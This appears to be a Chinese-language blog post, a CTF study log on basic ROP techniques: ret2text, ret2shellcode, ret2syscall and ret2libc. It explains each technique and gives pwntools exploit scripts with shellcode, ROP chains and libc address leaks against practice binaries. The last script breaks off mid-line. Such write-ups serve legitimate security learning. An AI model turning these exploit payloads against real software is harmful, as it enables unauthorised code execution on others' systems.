@@ -1,0 +1,279 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF_wiki | Star</title><meta name="author" content="Star"><meta name="copyright" content="Star"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="记录一下CTF_wiki的学习历程，回归下基础 基本ROPret2text原理控制程序执行程序本身已有的代码，可以利用ROP，找到对应返回的代码位置，绕开一些保护即可。 例子一道简单的32位程序，开启了NX保护和Partial RELRO保护。    调用了gets函数，这是一个危险函数，不会限制输入字符的个数，因此存在栈溢出，而且我们发现存在后门函数，又没有其他保护机制，所以可以直接栈溢出，若直">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF_wiki">
+<meta property="og:url" content="http://example.com/2025/10/05/CTF-wiki/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="记录一下CTF_wiki的学习历程，回归下基础 基本ROPret2text原理控制程序执行程序本身已有的代码，可以利用ROP，找到对应返回的代码位置，绕开一些保护即可。 例子一道简单的32位程序，开启了NX保护和Partial RELRO保护。    调用了gets函数，这是一个危险函数，不会限制输入字符的个数，因此存在栈溢出，而且我们发现存在后门函数，又没有其他保护机制，所以可以直接栈溢出，若直">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/1.jpg">
+<meta property="article:published_time" content="2025-10-05T02:54:23.983Z">
+<meta property="article:modified_time" content="2025-10-08T08:06:19.913Z">
+<meta property="article:author" content="Star">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTF_wiki",
+  "url": "http://example.com/2025/10/05/CTF-wiki/",
+  "image": "http://example.com/img/1.jpg",
+  "datePublished": "2025-10-05T02:54:23.983Z",
+  "dateModified": "2025-10-08T08:06:19.913Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Star",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/10/05/CTF-wiki/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTF_wiki',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://i.loli.net/2019/09/09/5oDRkWVKctx2b6A.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-graduation-cap"></i><span> Blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Live</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> shuoshuo</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> photos</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Star</span></a><a class="nav-page-title" href="/"><span class="site-name">CTF_wiki</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-graduation-cap"></i><span> Blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Live</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> shuoshuo</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> photos</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CTF_wiki</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-10-05T02:54:23.983Z" title="Created 2025-10-05 10:54:23">2025-10-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-08T08:06:19.913Z" title="Updated 2025-10-08 16:06:19">2025-10-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>记录一下CTF_wiki的学习历程，回归下基础</p>
+<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>控制程序执行程序本身已有的代码，可以利用ROP，找到对应返回的代码位置，绕开一些保护即可。</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>一道简单的32位程序，开启了NX保护和Partial RELRO保护。</p>
+<p><img src="/images/CTF_wiki_ret2text_1.png"></p>
+<p><img src="/images/CTF_wiki_ret2text_2.png"></p>
+<p><img src="/images/CTF_wiki_ret2text_3.png"></p>
+<p>调用了gets函数，这是一个危险函数，不会限制输入字符的个数，因此存在栈溢出，而且我们发现存在后门函数，又没有其他保护机制，所以可以直接栈溢出，若直接将返回地址直接改为secure函数，需要输入的数与程序生成的随机数一样才能获得shell。</p>
+<p><img src="/images/CTF_wiki_ret2text_4.png"></p>
+<p>通过看汇编知道，可以直接调用system(‘&#x2F;bin&#x2F;sh’)获得shell。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&#x27;./ret2text&#x27;)</span><br><span class="line"></span><br><span class="line">backdoor=0x0804863A</span><br><span class="line">offest=112</span><br><span class="line"></span><br><span class="line">payload=cyclic(offest)+p32(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>即控制程序执行shellcode代码，通常情况下，shellcode需要自行编写，在栈溢出的基础上想要执行shellcode，需要在运行时shellcode所在区域具有可执行。</p>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p><img src="/images/CTF_wiki_ret2shellcode_1.png"></p>
+<p>一道32位的题目，并没有开启NX保护，说明具有可读、可写、可执行段，也就可以打shellcode了。</p>
+<p><img src="/images/CTF_wiki_ret2shellcode_2.png"></p>
+<p><img src="/images/CTF_wiki_ret2shellcode_3.png"></p>
+<p>也是存在栈溢出，并将输入的数据前0x64个字节复制给buf2。因为在本题buf2所在的bss段是可读、可写、可执行的，因此可以输入先shellcode再补齐至栈溢出，并将返回地址改为buf2的地址即可。（由于本地环境原因，没能打通本地，但exp是没问题的，可以打远程）</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&#x27;./ret2shellcode&#x27;)</span><br><span class="line"></span><br><span class="line">offest=112</span><br><span class="line">bss=0x0804A080</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode.ljust(offest,b&#x27;a&#x27;)+p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="sniperoj-pwn100-shellcode-x86-64"><a href="#sniperoj-pwn100-shellcode-x86-64" class="headerlink" title="sniperoj-pwn100-shellcode-x86-64"></a>sniperoj-pwn100-shellcode-x86-64</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><img src="/images/CTF_wiki_shellcode_1.png"></p>
+<p>这是一道64位的题目，同样是没有开启NX保护（因此大概率也是打shellcode），但开启了PIE保护。</p>
+<p><img src="/images/CTF_wiki_shellcode_2.png"></p>
+<p>这里程序给了我们buf的地址，buf是在栈上的，而堆栈是可执行的，因此可以打shellcode。不一样的是这次使用的是read函数进行输入，有长度限制，那么就得找一下符合长度的shellcode了，不能直接使用pwntools中的shellcraft直接生成，因为32位的长度是44，64位的长度是48，若直接使用，无法执行完整的shellcode。这里就去搜一下或让ai编写一个即可。</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">io=process(&#x27;./sniperoj-pwn100-shellcode-x86-64&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode=b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&#x27;[&#x27;)</span><br><span class="line">buf_addr=io.recvuntil(&#x27;]&#x27;,drop=True)</span><br><span class="line">buf_addr=int(buf_addr,16)</span><br><span class="line">print(buf_addr)</span><br><span class="line"></span><br><span class="line">payload=cyclic(0x10+8)+p64(buf_addr+32)+shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>执行系统调用获取shell，记住一些常用的系统调用号即可。32位是用eax存储系统调用号，使用int 0x80表示执行系统调用，64位是rax存储系统调用号，使用syscall表示执行系统调用。</p>
+<h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p><img src="/images/CTF_wiki_ret2syscall_1.png"></p>
+<p>一道32位的静态编译题目，静态编译的话，可以给我们很多东西（函数或者gadget），打法就有很多，这里主要使用ret2syscall。</p>
+<p><img src="/images/CTF_wiki_ret2syscall_2.png"></p>
+<p>发现有gets函数存在栈溢出，但没有system和shellcode，因此可以打ret2syscall，此次需要我们把对应的参数放到对应的寄存器中，并执行系统调用，如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&#x27;/bin/sh&#x27;,NULL,NULL)</span><br></pre></td></tr></table></figure>
+
+<p>在32位中用eax存放该函数的系统调用号，分别用ebx、ecx、edx存放第一、第二、第三个参数。接下来就是找到相对应的地址就行了。</p>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch=&#x27;i386&#x27;</span><br><span class="line">io=process(&#x27;./ret2syscall&#x27;)</span><br><span class="line"></span><br><span class="line">eax=0x080bb196</span><br><span class="line">edx_ecx_ebx=0x0806eb90</span><br><span class="line">bin_sh=0x080be408</span><br><span class="line">int_0x80=0x08049421</span><br><span class="line"></span><br><span class="line">payload=cyclic(112)+p32(eax)+p32(0xb)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(bin_sh)+p32(int_0x80)</span><br><span class="line">io.sendlineafter(b&quot;do?&quot;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>该攻击方式主要涉及延迟绑定技术，即plt和got表的相关知识。这中方式通常是返回至某个函数的plt处或函数的具体位置，一般情况下是system(“&#x2F;bin&#x2F;sh”)。</p>
+<h3 id="知识点——延迟绑定"><a href="#知识点——延迟绑定" class="headerlink" title="知识点——延迟绑定"></a>知识点——延迟绑定</h3><p>在Linux系统中，动态链接主要依赖两个重要的数据结构：<strong>GOT（全局偏移量表）和PLT（程序链接表）</strong>。</p>
+<p><strong>GOT表</strong>是数据段中的表，<strong>存储</strong>了<strong>所有需要动态链接的函数和变量地址</strong>，当程序<strong>第一次调用</strong>函数时，链接器会在<strong>动态链接库中查找其地址</strong>，然后将该<strong>地址放入GOT表</strong>中的相应条目中，当<strong>再次调用</strong>时可以<strong>直接从GOT表</strong>中获取该地址就行了。</p>
+<p><strong>PLT表</strong>是代码段中的表，包含了<strong>一系列跳转指令</strong>，用于<strong>跳转到GOT表</strong>中相应条目。当<strong>调用一个函数</strong>时，会<strong>先跳转到PLT表中</strong>的相应条目，<strong>再通过该条目跳到GOT表中</strong>的相应条目，<strong>最后</strong>再跳转到函数在链接库中<strong>实际地址</strong>。</p>
+<p>延迟绑定可以延迟函数地址解析过程，直到这个函数被实际调用为止，程序中的call指令会跳转到对应的PLT表，然后PLT第一条指令再跳转到GOT表中存放的地址。</p>
+<h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><p><img src="/images/CTF_wiki_ret2libc1_1.png"></p>
+<p><img src="/images/CTF_wiki_ret2libc1_2.png"></p>
+<p><img src="/images/CTF_wiki_ret2libc1_3.png"></p>
+<p>一道32位的题目，存在栈溢出、system函数与&#x2F;bin&#x2F;sh字符串，这里只需要传参将&#x2F;bin&#x2F;sh字符串作为参数传入到system函数即可。</p>
+<h3 id="例1的exp"><a href="#例1的exp" class="headerlink" title="例1的exp"></a>例1的exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">elf=ELF(&#x27;./ret2libc1&#x27;)</span><br><span class="line">io=process(&#x27;./ret2libc1&#x27;)</span><br><span class="line"></span><br><span class="line">system=elf.plt[&#x27;system&#x27;]</span><br><span class="line">bin_sh=0x08048720</span><br><span class="line"></span><br><span class="line">payload=cyclic(112)+p32(system)+p32(0)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><p>也是一道简单的32位题目，同样存在栈溢出与system函数，但是没有&#x2F;bin&#x2F;sh字符串了，此时需要我们写入。</p>
+<h3 id="例2的exp"><a href="#例2的exp" class="headerlink" title="例2的exp"></a>例2的exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">elf=ELF(&#x27;./ret2libc2&#x27;)</span><br><span class="line">io=process(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">pop_ebp_ret=0x0804872f</span><br><span class="line">buf2=0x0804A080</span><br><span class="line">gets=elf.plt[&#x27;gets&#x27;]</span><br><span class="line">system=elf.plt[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*112+p32(gets)+p32(pop_ebp_ret)+p32(buf2)+p32(system)+p32(0)+p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h3><p>又在例2的基础上去掉了system函数，那么这时就需要寻找system函数地址以及&#x2F;bin&#x2F;sh字符串地址，因为几乎所有函数都属于libc中，而一般情况下都会给我们相应的libc.so动态链接库文件，或者自己泄漏出去找。在动态链接库中函数之间的偏移是一定的，因此我们可以通过某些手段泄漏该程序libc，从而就可以直到其他函数了。</p>
+<h3 id="例3的exp"><a href="#例3的exp" class="headerlink" title="例3的exp"></a>例3的exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">elf=ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line">libc=ELF(&#x27;./ret2libc3.so&#x27;)</span><br><span class="line">io=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">main=elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">payload=cyclic(112)+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">libc_base=puts-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><span class="line"></span><br><span class="line">payload=cyclic(104)+p32(system)+p32(0)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="train-cs-nctu-edu-tw-ret2libc"><a href="#train-cs-nctu-edu-tw-ret2libc" class="headerlink" title="train.cs.nctu.edu.tw:ret2libc"></a>train.cs.nctu.edu.tw:ret2libc</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p><img src="/images/CTF_wiki_ret2libc.png"></p>
+<p>一道32位题目，直接就给了我们puts函数地址与&#x2F;bin&#x2F;sh字符串的地址，且给了我们相应的libc文件，直接打就行了。</p>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">elf=ELF(&#x27;./ret2libc&#x27;)</span><br><span class="line">libc=ELF(&#x27;./ret2libc.so.6&#x27;)</span><br><span class="line">io=process(&#x27;./ret2libc&#x27;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&#x27;is&#x27;)</span><br><span class="line">bin_sh=int(io.recvuntil(&#x27;\n&#x27;,drop=True),16)</span><br><span class="line">print(hex(bin_sh))</span><br><span class="line">io.recvuntil(b&#x27;is&#x27;)</span><br><span class="line">puts=int(io.recvuntil(&#x27;\n&#x27;,drop=True),16)</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">libc_base=puts-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload=cyclic(32)+p32(system)+p32(0)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ropasaurusrex"><a href="#ropasaurusrex" class="headerlink" title="ropasaurusrex"></a>ropasaurusrex</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p><img src="/images/CTF_wiki_ropasaurusrex_1.png"></p>
+<p><img src="/images/CTF_wiki_ropasaurusrex_2.png"></p>
+<p>一道32位题目，这次使用write函数泄漏libc即可。</p>
+<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">elf=ELF(&#x27;./ropasaurusrex&#x27;)</span><br><span class="line">libc=ELF(&#x27;./ropasaurusrex.so&#x27;)</span><br><span class="line">io=process(&#x27;./ropasaurusrex&#x27;)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got=elf.got[&#x27;write&#x27;]</span><br><span class="line">main=0x080483F4</span><br><span class="line"></span><br><span class="line">payload=cyclic(0x88+4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write=u32(io.recv(4))</span><br><span class="line">print(hex(write))</span><br><span class="line"></span><br><span class="line">libc_base=write-libc.sym[&#x27;write&#x27;]</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><span class="line"></span><br><span class="line">payload=cyclic(0x88+4)+p32(system)+p32(0)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="r0pbaby"><a href="#r0pbaby" class="headerlink" title="r0pbaby"></a>r0pbaby</h2><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>通过运行程序，发现该程序会直接给出函数地址，而且存在溢出，因此直接打即可。</p>
+<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p=process(&#x27;./r0pbaby&#x27;)</span><br><span class="line">elf=ELF(&#x27;./r0pbaby&#x27;)</span><br><span class="line">rdi_offset=0x0000000000021102</span><br><span class="line">p.recvuntil(b&#x27;: &#x27;)</span><br><span class="line">p.sendline(b&#x27;2&#x27;)</span><br><span class="line">p.recvuntil(b&#x27;symbol: &#x27;)</span><br><span class="line">p.sendline(b&#x27;system&#x27;)</span><br><span class="line">p.recvuntil(b&#x27;: &#x27;)</span><br><span class="line">sys_addr=p.recvuntil(&#x27;\n&#x27;,drop=True)</span><br><span class="line">sys_addr=int(sys_addr,16)</span><br><span class="line">libc=LibcSearcher(&#x27;system&#x27;,sys_addr)</span><br><span class="line">libc_base=sys_addr-libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_addr=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">rdi_addr=libc_base+rdi_offset</span><br><span class="line">payload=b&#x27;a&#x27;*8+p64(rdi_addr)+p64(bin_addr)+p64(sys_addr)</span><br><span class="line">p.recvuntil(b&#x27;: &#x27;)</span><br><span class="line">p.sendline(b&#x27;3&#x27;)</span><br><span class="line">p.recvuntil(b&#x27;): &#x27;)</span><br><span class="line">length=len(payload)</span><br><span class="line">print (length)</span><br><span class="line">print (str(length))</span><br><span 